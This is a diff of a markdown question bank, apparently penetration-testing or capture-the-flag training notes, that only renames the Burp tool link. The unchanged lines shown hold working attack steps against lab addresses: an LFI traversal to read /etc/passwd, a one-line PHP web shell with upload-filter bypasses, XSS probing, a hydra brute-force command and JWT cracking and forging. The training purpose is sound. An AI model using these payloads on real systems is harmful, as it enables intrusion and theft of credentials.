@@ -38,7 +38,7 @@
 
 ### Q3 🟡 — Exploit an LFI on `http://10.10.10.10/page.php?file=about` to read /etc/passwd
 
-**Category:** LFI | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burp.md)
+**Category:** LFI | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burpsuite.md)
 
 **Steps:**
 1. Test traversal: `curl 'http://10.10.10.10/page.php?file=../../../../etc/passwd'`
@@ -57,7 +57,7 @@
 
 ### Q4 🟡 — Upload a PHP shell via `http://10.10.10.15/upload.php`
 
-**Category:** File upload | **Tools:** [burp](../../tools/burp.md), [curl](../../tools/curl.md)
+**Category:** File upload | **Tools:** [burp](../../tools/burpsuite.md), [curl](../../tools/curl.md)
 
 **Steps:**
 1. Create `shell.php`:
@@ -65,7 +65,7 @@
    <?php system($_GET['c']); ?>
    ```
 2. Upload via the form; if `.php` blocked, try `.phtml`, `.phar`, `.php5`, or `shell.php.jpg` with magic bytes.
-3. Intercept in [burp](../../tools/burp.md) and change `Content-Type: image/jpeg`.
+3. Intercept in [burp](../../tools/burpsuite.md) and change `Content-Type: image/jpeg`.
 4. Find upload path (often `/uploads/`) — see Q1.
 5. Trigger: `curl 'http://10.10.10.15/uploads/shell.php?c=id'`
 
@@ -77,7 +77,7 @@
 
 ### Q5 🟡 — Find the reflected XSS parameter on `http://10.10.10.18/search`
 
-**Category:** XSS | **Tools:** [curl](../../tools/curl.md), [ffuf](../../tools/ffuf.md), [burp](../../tools/burp.md)
+**Category:** XSS | **Tools:** [curl](../../tools/curl.md), [ffuf](../../tools/ffuf.md), [burp](../../tools/burpsuite.md)
 
 **Steps:**
 1. Test: `curl 'http://10.10.10.18/search?q=<script>alert(1)</script>'` — check if the payload is echoed unescaped.
@@ -96,7 +96,7 @@
 
 **Steps:**
 1. `gobuster dir -u http://10.10.10.20 -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.txt`
-2. Found `/admin/login.php`. Capture POST in [burp](../../tools/burp.md).
+2. Found `/admin/login.php`. Capture POST in [burp](../../tools/burpsuite.md).
 3. `hydra -l admin -P rockyou.txt 10.10.10.20 http-post-form "/admin/login.php:username=^USER^&password=^PASS^:F=incorrect"` ← [why F=](../../tools/hydra.md#http-form)
 
 **Answer format:** admin credentials
@@ -151,7 +151,7 @@
 
 ### Q10 🟡 — Exploit an IDOR on `http://10.10.10.30/profile?id=1002`
 
-**Category:** Access control | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burp.md)
+**Category:** Access control | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burpsuite.md)
 
 **Steps:**
 1. Log in as a low-priv user, note your `id=`.
@@ -172,7 +172,7 @@
 **Category:** JWT / auth | **Tools:** [hashcat](../../tools/hashcat.md), `jwt_tool`
 
 **Steps:**
-1. Grab token from [burp](../../tools/burp.md) proxy: `eyJhbGciOi...`
+1. Grab token from [burp](../../tools/burpsuite.md) proxy: `eyJhbGciOi...`
 2. Identify alg: decode header at jwt.io — if `HS256`, it's crackable.
 3. `hashcat -m 16500 jwt.txt rockyou.txt` ← [why -m 16500](../../tools/hashcat.md#common-modes)
 4. Forge admin token: `jwt_tool <token> -T` then re-sign with cracked secret.
@@ -202,7 +202,7 @@
 ## 📌 Quick links
 
 - [gobuster](../../tools/gobuster.md) · [ffuf](../../tools/ffuf.md) · [curl](../../tools/curl.md)
-- [wpscan](../../tools/wpscan.md) · [hydra](../../tools/hydra.md) · [burp](../../tools/burp.md)
+- [wpscan](../../tools/wpscan.md) · [hydra](../../tools/hydra.md) · [burp](../../tools/burpsuite.md)
 - [Web app testing playbook](../../playbooks/webapp-playbook.md)
 - [12-web-apps README](../../12-web-apps/README.md)
 - [13-sqli question bank](./13-sqli.md) · [17-cloud README](../../17-cloud/README.md)
